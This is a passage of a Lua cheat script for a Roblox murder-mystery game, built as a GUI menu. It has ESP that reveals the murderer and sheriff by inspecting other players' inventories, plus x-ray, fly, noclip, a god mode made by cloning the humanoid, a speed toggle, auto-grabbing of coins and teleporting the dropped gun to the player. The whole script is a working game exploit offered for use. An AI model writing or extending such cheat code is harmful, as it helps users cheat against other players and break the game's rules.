	if team then --For teams, left over from origianl but never removed
		txtlbl.TextColor3 = Color3.new(0,0,255)
		frame.BackgroundColor3 = Color3.new(0,0,255)
	else
		txtlbl.TextColor3 = Color3.new(colors1,colors2,colors3)
		frame.BackgroundColor3 = Color3.new(colors1,colors2,colors3)
	end
end

function findmurderer() --Find who the murderer is
	local colors1 = 255
	local colors2 = 0
	local colors3 = 0
	for i, v in pairs(game:GetService("Players"):GetChildren()) do
		if v ~= game:GetService("Players").LocalPlayer then
			for i,v in pairs(v.Backpack:GetChildren()) do --Checks backpack for knife
				if v.Name == "Knife" then
					if espnames == true then
						local teamname = v.Parent.Parent.Name
						if v.Parent.Parent.Character.Head ~= nil then
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					elseif espnames == false then
						local teamname = "Murderer"
						if v.Parent.Parent.Character.Head ~= nil then
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					end
					murderer = v.Parent.Parent.Name
					if printvar == true then
						print(murderer.." is Murderer")
					end
				end
			end
			for i,v in pairs(v.Character:GetChildren()) do --Checks workspace player for knife (holding it)
				if v.Name == "Knife" then
					if espnames == true then
						local teamname = v.Parent.Name
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					elseif espnames == false then
						local teamname = "Murderer"
						if v.Parent.Head ~= nil then
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from murderer!")
							end
						end
					end
					murderer = v.Parent.Name
					if printvar == true then --Tried to failproof to stop printing nil
						local murderer1 = tostring(v.Parent.Name)
						print(murderer1.." is Murderer")
					end
				end
			end
		end
	end
end
	
function findsheriff() --Find who the sheriff is
	local colors1 = 0
	local colors2 = 0
	local colors3 = 255
	for i, v in pairs(game:GetService("Players"):GetChildren()) do
		if v ~= game:GetService("Players").LocalPlayer then
			for i,v in pairs(v.Backpack:GetChildren()) do
				if v.Name == "Revolver" or v.Name == "Gun" then --Lazy to check if its revolver or gun and checks backpack for gun
					if espnames == true then
						local teamname = v.Parent.Parent.Name
						if v.Parent.Parent.Character.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					elseif espnames == false then
						local teamname = "Sheriff"
						if v.Parent.Parent.Character.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Parent.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					end
					sheriff = v.Parent.Parent.Name
					if printvar == true then
						local sheriff1 = tostring(v.Parent.Parent.Name)
						print(sheriff1.." is Sheriff")
					end
				end
			end
			for i,v in pairs(v.Character:GetChildren()) do
				if v.Name == "Revolver" or v.Name == "Gun" then --Lazy to check if its revolver or gun and checks workspace player for gun (holding it)
					if espnames == true then
						local teamname = v.Parent.Name
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					elseif espnames == false then
						local teamname = "Sheriff"
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Parent.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					end
					sheriff = v.Parent.Name
					if printvar == true then
						local sheriff1 = tostring(v.Parent.Name)
						print(sheriff1.." is Sheriff")
					end
				end
			end
		end
	end
end

function findplayers() --Find all players but local player
	findmurderer() --Finds murderer
	findsheriff() --Finds sheriff
	local colors1 = 0
	local colors2 = 255
	local colors3 = 0
	for i, v in pairs(game:GetService("Players"):GetChildren()) do
		if v ~= game:GetService("Players").LocalPlayer then --If not local player
			if v.Name ~= murderer then --If not murderer
				if v.Name ~= sheriff then --If not sheriff
					if espnames == true then
						local teamname = v.Name
						if v.Character.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					elseif espnames == false then
						local teamname = "Innocents"
						if v.Parent.Head ~= nil then --Tried to failproof to stop printing nil
							Create(v.Character.Head, false, colors1 ,colors2, colors3, teamname)
						else
							if printvar == true then
								print("Head missing from sheriff!")
							end
						end
					end
				end
			end
		end
	end
end

function Clear() --Clears all the esps
	for _,v in pairs(player.PlayerGui:children()) do
		if v.Name == "tracker" and v:isA("BillboardGui") then
			v:Destroy()
		end
	end
end

function XrayOn(obj) --Enables xray
	for _,v in pairs(obj:GetChildren()) do 
		if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then
			v.LocalTransparencyModifier = 0.75
		end
	XrayOn(v) 
	end
end 

function XrayOff(obj) --Disables xray
	for _,v in pairs(obj:GetChildren()) do
		if (v:IsA("BasePart")) and not v.Parent:FindFirstChild("Humanoid") then
			v.LocalTransparencyModifier = 0
		end XrayOff(v)
	end
end

function sFLY() --Fly function
	repeat wait() until LP and LP.Character and LP.Character:FindFirstChild('Torso') and LP.Character:FindFirstChild('Humanoid')
	repeat wait() until mouse
	
	local T = LP.Character.Torso
	local CONTROL = {F = 0, B = 0, L = 0, R = 0}
	local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
	local SPEED = 0
	
	local function FLY()
		FLYING = true
		local BG = Instance.new('BodyGyro', T)
		local BV = Instance.new('BodyVelocity', T)
		BG.P = 9e4
		BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
		BG.cframe = T.CFrame
		BV.velocity = Vector3.new(0, 0.1, 0)
		BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
		spawn(function()
			repeat wait()
				LP.Character.Humanoid.PlatformStand = true
				if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
					SPEED = 50
				elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
					SPEED = 0
				end
				if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
				elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
					BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
				else
					BV.velocity = Vector3.new(0, 0.1, 0)
				end
				BG.cframe = workspace.CurrentCamera.CoordinateFrame
			until not FLYING
			CONTROL = {F = 0, B = 0, L = 0, R = 0}
			lCONTROL = {F = 0, B = 0, L = 0, R = 0}
			SPEED = 0
			BG:destroy()
			BV:destroy()
			LP.Character.Humanoid.PlatformStand = false
		end)
	end
	
	mouse.KeyDown:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 1
		elseif KEY:lower() == 's' then
			CONTROL.B = -1
		elseif KEY:lower() == 'a' then
			CONTROL.L = -1 
		elseif KEY:lower() == 'd' then 
			CONTROL.R = 1
		end
	end)
	
	mouse.KeyUp:connect(function(KEY)
		if KEY:lower() == 'w' then
			CONTROL.F = 0
		elseif KEY:lower() == 's' then
			CONTROL.B = 0
		elseif KEY:lower() == 'a' then
			CONTROL.L = 0
		elseif KEY:lower() == 'd' then
			CONTROL.R = 0
		end
	end)
	FLY()
end

function NOFLY() --Unfly function
	FLYING = false
	LP.Character.Humanoid.PlatformStand = false
end

local noclipcoro = coroutine.wrap(function() --Noclip function
	while true do
		if NClip == true then
			if game.Players ~= nil then
				if game.Players.LocalPlayer ~= nil then
					if game.Players.LocalPlayer.Character ~= nil then
						if game.Players.LocalPlayer.Character:FindFirstChild("Torso") ~= nil then
							if game.Players.LocalPlayer.Character:FindFirstChild("Head") ~= nil then
								game.Players.LocalPlayer.Character.Torso.CanCollide = false
								game.Players.LocalPlayer.Character.Head.CanCollide = false
							end
						end
					end
				end
			end
		end
	game:service("RunService").Stepped:wait()
	end
end)

noclipcoro() --For noclip to work

game:GetService("Players").LocalPlayer.CharacterAdded:connect(function(character) --Resets specific things for ease
	flyvar = false
	FlyActive.Text = "Inactive"
	FlyActive.TextColor3 = Color3.new(1, 0, 1)
	godmodevar = false
	GodModeActive.Text = "Inactive"
	GodModeActive.TextColor3 = Color3.new(1, 0, 1)
	Clear()
	MSESPActive.Text = "Inactive"
	MSESPActive.TextColor3 = Color3.new(1, 0, 1)
	PlayersEspActive.Text = "Inactive"
	PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
	EspOffActive.Text = "Active"
	EspOffActive.TextColor3 = Color3.new(0, 1, 0)
end)

mouse.KeyDown:connect(function(KeyDown) --If shift is held, run
	if KeyDown == "0" and runActive == false and keyOff == false then
		runActive = true
		player.Character.Humanoid.WalkSpeed = 32
		RunActiveGui.Text = "Active"
		RunActiveGui.TextColor3 = Color3.new(0, 1, 0)
	end
end)

mouse.KeyUp:connect(function(KeyUp) --If shift is released, walk
	if KeyUp == "0" and runActive == true and keyOff == false then
		runActive = false
		player.Character.Humanoid.WalkSpeed = 16
		RunActiveGui.Text = "Inactive"
		RunActiveGui.TextColor3 = Color3.new(1, 0, 1)
	end
end)

function coingrabberfunc() --Coin grabber function
	local children = game.Workspace:GetChildren()
	for _, child in pairs(children) do
  		for _, child in pairs(child:GetChildren()) do
       		table.insert(children, child)
  		 end
  		 if child:IsA("BasePart") and child.Name == "Coin" then
         	child.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
		end
  	end
end

function godmodefunc() --Godmode function
	local player = game.Players.LocalPlayer
	if player.Character then
		if player.Character:FindFirstChild("Humanoid") then
			player.Character.Humanoid.Name = "1"
		end
		local l = player.Character["1"]:Clone()
		l.Parent = player.Character
		l.Name = "Humanoid"; wait(0.1)
		player.Character["1"]:Destroy()
		workspace.CurrentCamera.CameraSubject = player.Character.Humanoid
		player.Character.Animate.Disabled = true; wait(0.1)
		player.Character.Animate.Disabled = false
	end
end

--Coin Grabber--
Coin.Name = "CoinGrabber"
Coin.Parent = Main
Coin.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Coin.BorderColor3 = Color3.new(0, 0.607843, 1)
Coin.BorderSizePixel = 5
Coin.Position = UDim2.new(0, 0, 0.215, 0)
Coin.Size = UDim2.new(1.005, 0, 0.08, 0)
Coin.ZIndex = 4
Coin.Font = Enum.Font.SciFi
Coin.FontSize = Enum.FontSize.Size24
Coin.Text = "Coin Grabber ["..string.upper(coinkey).."]"
Coin.TextColor3 = Color3.fromRGB(255, 255, 26)
Coin.TextSize = 20
Coin.TextWrapped = true
Coin.MouseButton1Down:connect(function(x, y)
	coingrabberfunc()
end)

--Murderer/Sheriff Esp--
MSESPActive.Name = "MSEspActive"
MSESPActive.Parent = Main
MSESPActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
MSESPActive.BorderColor3 = Color3.new(0, 0.607843, 1)
MSESPActive.BorderSizePixel = 5
MSESPActive.Position = UDim2.new(0.755, 0, 0.315, 0)
MSESPActive.Size = UDim2.new(0.25, 0, 0.08, 0)
MSESPActive.ZIndex = 4
MSESPActive.Font = Enum.Font.SciFi
MSESPActive.FontSize = Enum.FontSize.Size24
MSESPActive.Text = "Inactive"
MSESPActive.TextColor3 = Color3.new(1, 0, 1)
MSESPActive.TextSize = 20
MSESPActive.TextWrapped = true

MSEsp.Name = "MSEsp"
MSEsp.Parent = Main
MSEsp.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
MSEsp.BorderColor3 = Color3.new(0, 0.607843, 1)
MSEsp.BorderSizePixel = 5
MSEsp.Position = UDim2.new(0, 0, 0.315, 0)
MSEsp.Size = UDim2.new(0.75, 0, 0.08, 0)
MSEsp.ZIndex = 4
MSEsp.Font = Enum.Font.SciFi
MSEsp.FontSize = Enum.FontSize.Size24
MSEsp.Text = "Murderer/Sheriff Esp ["..string.upper(MSkey).."]"
MSEsp.TextColor3 = Color3.fromRGB(255, 102, 255)
MSEsp.TextSize = 20
MSEsp.TextWrapped = true
MSEsp.MouseButton1Down:connect(function(x, y)
	murderer = "None"
	sheriff = "None"
	Clear()
	findmurderer()
	findsheriff()
	if printvar == true then
		print("Murderer/Sheriff")
	end
	MSESPActive.Text = "Active"
	MSESPActive.TextColor3 = Color3.new(0, 1, 0)
	PlayersEspActive.Text = "Inactive"
	PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
	EspOffActive.Text = "Inactive"
	EspOffActive.TextColor3 = Color3.new(1, 0, 1)
end)

--All Players Esp
PlayersEspActive.Name = "PlayersEspActive"
PlayersEspActive.Parent = Main
PlayersEspActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
PlayersEspActive.BorderColor3 = Color3.new(0, 0.607843, 1)
PlayersEspActive.BorderSizePixel = 5
PlayersEspActive.Position = UDim2.new(0.755, 0, 0.415, 0)
PlayersEspActive.Size = UDim2.new(0.25, 0, 0.08, 0)
PlayersEspActive.ZIndex = 4
PlayersEspActive.Font = Enum.Font.SciFi
PlayersEspActive.FontSize = Enum.FontSize.Size24
PlayersEspActive.Text = "Inactive"
PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
PlayersEspActive.TextSize = 20
PlayersEspActive.TextWrapped = true

PlayersEsp.Name = "PlayersEsp"
PlayersEsp.Parent = Main
PlayersEsp.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
PlayersEsp.BorderColor3 = Color3.new(0, 0.607843, 1)
PlayersEsp.BorderSizePixel = 5
PlayersEsp.Position = UDim2.new(0, 0, 0.415, 0)
PlayersEsp.Size = UDim2.new(0.75, 0, 0.08, 0)
PlayersEsp.ZIndex = 4
PlayersEsp.Font = Enum.Font.SciFi
PlayersEsp.FontSize = Enum.FontSize.Size24
PlayersEsp.Text = "All Players Esp ["..string.upper(playerskey).."]"
PlayersEsp.TextColor3 = Color3.fromRGB(102, 255, 51)
PlayersEsp.TextSize = 20
PlayersEsp.TextWrapped = true
PlayersEsp.MouseButton1Down:connect(function(x, y)
	Clear()
	if printvar == true then
		print("Players Esp")
	end
	MSESPActive.Text = "Inactive"
	MSESPActive.TextColor3 = Color3.new(1, 0, 1)
	PlayersEspActive.Text = "Active"
	PlayersEspActive.TextColor3 = Color3.new(0, 1, 0)
	EspOffActive.Text = "Inactive"
	EspOffActive.TextColor3 = Color3.new(1, 0, 1)
	findplayers()
end)

--Esp Off
EspOffActive.Name = "EspOffActive"
EspOffActive.Parent = Main
EspOffActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
EspOffActive.BorderColor3 = Color3.new(0, 0.607843, 1)
EspOffActive.BorderSizePixel = 5
EspOffActive.Position = UDim2.new(0.755, 0, 0.515, 0)
EspOffActive.Size = UDim2.new(0.25, 0, 0.08, 0)
EspOffActive.ZIndex = 4
EspOffActive.Font = Enum.Font.SciFi
EspOffActive.FontSize = Enum.FontSize.Size24
EspOffActive.Text = "Active"
EspOffActive.TextColor3 = Color3.new(0, 1, 0)
EspOffActive.TextSize = 20
EspOffActive.TextWrapped = true

EspOff.Name = "EspOff"
EspOff.Parent = Main
EspOff.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
EspOff.BorderColor3 = Color3.new(0, 0.607843, 1)
EspOff.BorderSizePixel = 5
EspOff.Position = UDim2.new(0, 0, 0.515, 0)
EspOff.Size = UDim2.new(0.75, 0, 0.08, 0)
EspOff.ZIndex = 4
EspOff.Font = Enum.Font.SciFi
EspOff.FontSize = Enum.FontSize.Size24
EspOff.Text = "Esp Off ["..string.upper(espoffkey).."]"
EspOff.TextColor3 = Color3.fromRGB(255, 255, 255)
EspOff.TextSize = 20
EspOff.TextWrapped = true
EspOff.MouseButton1Down:connect(function(x, y)
	Clear()
	if printvar == true then
		print("Esp Off")
	end
	MSESPActive.Text = "Inactive"
	MSESPActive.TextColor3 = Color3.new(1, 0, 1)
	PlayersEspActive.Text = "Inactive"
	PlayersEspActive.TextColor3 = Color3.new(1, 0, 1)
	EspOffActive.Text = "Active"
	EspOffActive.TextColor3 = Color3.new(0, 1, 0)
end)

--Run
RunActiveGui.Name = "RunActiveGui"
RunActiveGui.Parent = Main
RunActiveGui.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
RunActiveGui.BorderColor3 = Color3.new(0, 0.607843, 1)
RunActiveGui.BorderSizePixel = 5
RunActiveGui.Position = UDim2.new(0.755, 0, 0.615, 0)
RunActiveGui.Size = UDim2.new(0.25, 0, 0.08, 0)
RunActiveGui.ZIndex = 4
RunActiveGui.Font = Enum.Font.SciFi
RunActiveGui.FontSize = Enum.FontSize.Size24
RunActiveGui.Text = "Inactive"
RunActiveGui.TextColor3 = Color3.new(1, 0, 1)
RunActiveGui.TextSize = 20
RunActiveGui.TextWrapped = true

Run.Name = "Run"
Run.Parent = Main
Run.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Run.BorderColor3 = Color3.new(0, 0.607843, 1)
Run.BorderSizePixel = 5
Run.Position = UDim2.new(0, 0, 0.615, 0)
Run.Size = UDim2.new(0.75, 0, 0.08, 0)
Run.ZIndex = 4
Run.Font = Enum.Font.SciFi
Run.FontSize = Enum.FontSize.Size24
Run.Text = "Run [Shift]"
Run.TextColor3 = Color3.fromRGB(255, 51, 0)
Run.TextSize = 20
Run.TextWrapped = true
Run.MouseButton1Down:connect(function(x, y)
	if runActive == false then
		runActive = true
		player.Character.Humanoid.WalkSpeed = 32
		RunActiveGui.Text = "Active"
		RunActiveGui.TextColor3 = Color3.new(0, 1, 0)
	elseif runActive == true then
		runActive = false
		player.Character.Humanoid.WalkSpeed = 16
		RunActiveGui.Text = "Inactive"
		RunActiveGui.TextColor3 = Color3.new(1, 0, 1)
	end
end)

--Fly
FlyActive.Name = "FlyActive"
FlyActive.Parent = Main
FlyActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
FlyActive.BorderColor3 = Color3.new(0, 0.607843, 1)
FlyActive.BorderSizePixel = 5
FlyActive.Position = UDim2.new(0.755, 0, 0.715, 0)
FlyActive.Size = UDim2.new(0.25, 0, 0.08, 0)
FlyActive.ZIndex = 4
FlyActive.Font = Enum.Font.SciFi
FlyActive.FontSize = Enum.FontSize.Size24
FlyActive.Text = "Inactive"
FlyActive.TextColor3 = Color3.new(1, 0, 1)
FlyActive.TextSize = 20
FlyActive.TextWrapped = true

Fly.Name = "Fly"
Fly.Parent = Main
Fly.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Fly.BorderColor3 = Color3.new(0, 0.607843, 1)
Fly.BorderSizePixel = 5
Fly.Position = UDim2.new(0, 0, 0.715, 0)
Fly.Size = UDim2.new(0.75, 0, 0.08, 0)
Fly.ZIndex = 4
Fly.Font = Enum.Font.SciFi
Fly.FontSize = Enum.FontSize.Size24
Fly.Text = "Fly ["..string.upper(flykey).."]"
Fly.TextColor3 = Color3.fromRGB(204, 255, 255)
Fly.TextSize = 20
Fly.TextWrapped = true
Fly.MouseButton1Down:connect(function(x, y)
	if flyvar == false then
		sFLY()
		flyvar = true
		FlyActive.Text = "Active"
		FlyActive.TextColor3 = Color3.new(0, 1, 0)
	elseif flyvar == true then
		flyvar = false
		NOFLY()
		FlyActive.Text = "Inactive"
		FlyActive.TextColor3 = Color3.new(1, 0, 1)
	end
end)

--Noclip
NoclipActive.Name = "NoclipActive"
NoclipActive.Parent = Main
NoclipActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
NoclipActive.BorderColor3 = Color3.new(0, 0.607843, 1)
NoclipActive.BorderSizePixel = 5
NoclipActive.Position = UDim2.new(0.755, 0, 0.815, 0)
NoclipActive.Size = UDim2.new(0.25, 0, 0.08, 0)
NoclipActive.ZIndex = 4
NoclipActive.Font = Enum.Font.SciFi
NoclipActive.FontSize = Enum.FontSize.Size24
NoclipActive.Text = "Inactive"
NoclipActive.TextColor3 = Color3.new(1, 0, 1)
NoclipActive.TextSize = 20
NoclipActive.TextWrapped = true

Noclip.Name = "Noclip"
Noclip.Parent = Main
Noclip.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Noclip.BorderColor3 = Color3.new(0, 0.607843, 1)
Noclip.BorderSizePixel = 5
Noclip.Position = UDim2.new(0, 0, 0.815, 0)
Noclip.Size = UDim2.new(0.75, 0, 0.08, 0)
Noclip.ZIndex = 4
Noclip.Font = Enum.Font.SciFi
Noclip.FontSize = Enum.FontSize.Size24
Noclip.Text = "Noclip ["..string.upper(noclipkey).."]"
Noclip.TextColor3 = Color3.fromRGB(0, 102, 255)
Noclip.TextSize = 20
Noclip.TextWrapped = true
Noclip.MouseButton1Down:connect(function(x, y)
	if NClip == false then
		NClip = true
		if printvar == true then
			print("Noclip Enabled")
		end
		NoclipActive.Text = "Active"
		NoclipActive.TextColor3 = Color3.new(0, 1, 0)
	elseif NClip == true then
		NClip = false
		if printvar == true then
			print("Noclip Disabled")
		end
		NoclipActive.Text = "Inactive"
		NoclipActive.TextColor3 = Color3.new(1, 0, 1)
	end
end)

--GodMode
GodModeActive.Name = "GodModeActive"
GodModeActive.Parent = Main
GodModeActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GodModeActive.BorderColor3 = Color3.new(0, 0.607843, 1)
GodModeActive.BorderSizePixel = 5
GodModeActive.Position = UDim2.new(0.755, 0, 0.915, 0)
GodModeActive.Size = UDim2.new(0.25, 0, 0.08, 0)
GodModeActive.ZIndex = 4
GodModeActive.Font = Enum.Font.SciFi
GodModeActive.FontSize = Enum.FontSize.Size24
GodModeActive.Text = "Inactive"
GodModeActive.TextColor3 = Color3.new(1, 0, 1)
GodModeActive.TextSize = 20
GodModeActive.TextWrapped = true

GodMode.Name = "GodMode"
GodMode.Parent = Main
GodMode.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GodMode.BorderColor3 = Color3.new(0, 0.607843, 1)
GodMode.BorderSizePixel = 5
GodMode.Position = UDim2.new(0, 0, 0.915, 0)
GodMode.Size = UDim2.new(0.75, 0, 0.08, 0)
GodMode.ZIndex = 4
GodMode.Font = Enum.Font.SciFi
GodMode.FontSize = Enum.FontSize.Size24
GodMode.Text = "God Mode ["..string.upper(godmodekey).."]"
GodMode.TextColor3 = Color3.fromRGB(255, 255, 255)
GodMode.TextSize = 20
GodMode.TextWrapped = true
GodMode.MouseButton1Down:connect(function(x, y)
	if godmodevar == false then
		GodModeActive.Text = "Active"
		GodModeActive.TextColor3 = Color3.new(0, 1, 0)
		godmodevar = true
		godmodefunc()
	end
end)

--Xray On
GuiXrayOnActive.Name = "GuiXrayOnActive"
GuiXrayOnActive.Parent = Main
GuiXrayOnActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOnActive.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOnActive.BorderSizePixel = 5
GuiXrayOnActive.Position = UDim2.new(0.755, 0, 1.015, 0)
GuiXrayOnActive.Size = UDim2.new(0.25, 0, 0.08, 0)
GuiXrayOnActive.ZIndex = 4
GuiXrayOnActive.Font = Enum.Font.SciFi
GuiXrayOnActive.FontSize = Enum.FontSize.Size24
GuiXrayOnActive.Text = "Inactive"
GuiXrayOnActive.TextColor3 = Color3.new(1, 0, 1)
GuiXrayOnActive.TextSize = 20
GuiXrayOnActive.TextWrapped = true

GuiXrayOn.Name = "XrayOn"
GuiXrayOn.Parent = Main
GuiXrayOn.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOn.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOn.BorderSizePixel = 5
GuiXrayOn.Position = UDim2.new(0, 0, 1.015, 0)
GuiXrayOn.Size = UDim2.new(0.75, 0, 0.08, 0)
GuiXrayOn.ZIndex = 4
GuiXrayOn.Font = Enum.Font.SciFi
GuiXrayOn.FontSize = Enum.FontSize.Size24
GuiXrayOn.Text = "Xray On ["..string.upper(xrayonkey).."]"
GuiXrayOn.TextColor3 = Color3.fromRGB(255, 204, 102)
GuiXrayOn.TextSize = 20
GuiXrayOn.TextWrapped = true
GuiXrayOn.MouseButton1Down:connect(function(x, y)
	GuiXrayOnActive.Text = "Active"
	GuiXrayOnActive.TextColor3 = Color3.new(0, 1, 0)
	GuiXrayOffActive.Text = "Inactive"
	GuiXrayOffActive.TextColor3 = Color3.new(1, 0, 1)
	XrayOn(obj)
end)

--Xray Off
GuiXrayOffActive.Name = "GuiXrayOffActive"
GuiXrayOffActive.Parent = Main
GuiXrayOffActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOffActive.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOffActive.BorderSizePixel = 5
GuiXrayOffActive.Position = UDim2.new(0.755, 0, 1.115, 0)
GuiXrayOffActive.Size = UDim2.new(0.25, 0, 0.08, 0)
GuiXrayOffActive.ZIndex = 4
GuiXrayOffActive.Font = Enum.Font.SciFi
GuiXrayOffActive.FontSize = Enum.FontSize.Size24
GuiXrayOffActive.Text = "Active"
GuiXrayOffActive.TextColor3 = Color3.new(0, 1, 0)
GuiXrayOffActive.TextSize = 20
GuiXrayOffActive.TextWrapped = true

GuiXrayOff.Name = "XrayOff"
GuiXrayOff.Parent = Main
GuiXrayOff.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
GuiXrayOff.BorderColor3 = Color3.new(0, 0.607843, 1)
GuiXrayOff.BorderSizePixel = 5
GuiXrayOff.Position = UDim2.new(0, 0, 1.115, 0)
GuiXrayOff.Size = UDim2.new(0.75, 0, 0.08, 0)
GuiXrayOff.ZIndex = 4
GuiXrayOff.Font = Enum.Font.SciFi
GuiXrayOff.FontSize = Enum.FontSize.Size24
GuiXrayOff.Text = "Xray Off ["..string.upper(xrayoffkey).."]"
GuiXrayOff.TextColor3 = Color3.fromRGB(255, 153, 51)
GuiXrayOff.TextSize = 20
GuiXrayOff.TextWrapped = true
GuiXrayOff.MouseButton1Down:connect(function(x, y)
	GuiXrayOnActive.Text = "Inactive"
	GuiXrayOnActive.TextColor3 = Color3.new(1, 0, 1)
	GuiXrayOffActive.Text = "Active"
	GuiXrayOffActive.TextColor3 = Color3.new(0, 1, 0)
	XrayOff(obj)
end)

--Bring Gun to You
BringGun.Name = "BringGun"
BringGun.Parent = Main
BringGun.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
BringGun.BorderColor3 = Color3.new(0, 0.607843, 1)
BringGun.BorderSizePixel = 5
BringGun.Position = UDim2.new(0, 0, 1.215, 0)
BringGun.Size = UDim2.new(1.005, 0, 0.08, 0)
BringGun.ZIndex = 4
BringGun.Font = Enum.Font.SciFi
BringGun.FontSize = Enum.FontSize.Size24
BringGun.Text = "Teleport Gun ["..string.upper(bringgunkey).."]"
BringGun.TextColor3 = Color3.fromRGB(0, 255, 0)
BringGun.TextSize = 20
BringGun.TextWrapped = true
BringGun.MouseButton1Down:connect(function(x, y)
	if game.Workspace.GunDrop.CFrame ~= nil then
		game.Workspace.GunDrop.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
	else
		if printvar == true then
			print("Gun not currently dropped")
		end
	end
end)

--Keybinds
KeybindsActive.Name = "KeybindsActive"
KeybindsActive.Parent = Main
KeybindsActive.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
KeybindsActive.BorderColor3 = Color3.new(0, 0.607843, 1)
KeybindsActive.BorderSizePixel = 5
KeybindsActive.Position = UDim2.new(0.755, 0, 1.315, 0)
KeybindsActive.Size = UDim2.new(0.25, 0, 0.08, 0)
KeybindsActive.ZIndex = 4
KeybindsActive.Font = Enum.Font.SciFi
KeybindsActive.FontSize = Enum.FontSize.Size24
KeybindsActive.Text = "Active"
KeybindsActive.TextColor3 = Color3.new(0, 1, 0)
KeybindsActive.TextSize = 20
KeybindsActive.TextWrapped = true

Keybinds.Name = "Keybinds"
Keybinds.Parent = Main
Keybinds.BackgroundColor3 = Color3.new(0.188235, 0.188235, 0.188235)
Keybinds.BorderColor3 = Color3.new(0, 0.607843, 1)
Keybinds.BorderSizePixel = 5
Keybinds.Position = UDim2.new(0, 0, 1.315, 0)
Keybinds.Size = UDim2.new(0.75, 0, 0.08, 0)
Keybinds.ZIndex = 4
Keybinds.Font = Enum.Font.SciFi
Keybinds.FontSize = Enum.FontSize.Size24
Keybinds.Text = "Keybinds [Ctrl]"
Keybinds.TextColor3 = Color3.fromRGB(255, 255, 255)
Keybinds.TextSize = 20
Keybinds.TextWrapped = true
Keybinds.MouseButton1Down:connect(function(x, y)
	if keyOff == true then
		keyOff = false
		KeybindsActive.Text = "Active"
		KeybindsActive.TextColor3 = Color3.new(0, 1, 0)
	elseif keyOff == false then
		keyOff = true
		KeybindsActive.Text = "Inactive"
